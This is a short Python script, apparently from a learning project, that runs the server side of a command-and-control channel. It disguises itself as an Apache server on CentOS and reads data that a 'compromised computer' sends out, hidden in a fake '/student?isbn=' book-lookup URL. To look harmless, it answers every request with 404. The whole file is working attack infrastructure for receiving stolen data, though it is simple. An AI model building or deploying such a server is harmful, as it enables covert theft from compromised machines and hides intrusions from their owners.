#!/bin/python3

"""
C2 Server side code
"""
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 8900
# Leave blank to bind to all int otherwise specify c2 server IP address
BIND_ADDR = ""

CMD_REQUEST = "/student?isbn="

class C2Handler(BaseHTTPRequestHandler):
    """ This is a child class of the BaseHTTPRequestHandler class.
    It handles all HTTP request of our C2 server. """
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"
    
    # noinspection PyPep8Naming
    def do_GET(self):
        # compromised computer request exfiltrate datas
        if self.path.startswith(CMD_REQUEST):
            client = self.path.split(CMD_REQUEST)[1] 
            print(client)
        # first send back 404 to the client
        self.send_response(404)
        self.end_headers()


print("server version:", C2Handler.server_version)
print("sys_version:", C2Handler.sys_version)

server = HTTPServer((BIND_ADDR, PORT), C2Handler)
server.serve_forever()
# def run(server_class=HTTPServer, handler_class=BHTTPR):
#     server_address = ('', 8900)
#     httpd = server_class(server_address, handler_class)
#     httpd.serve_forever()


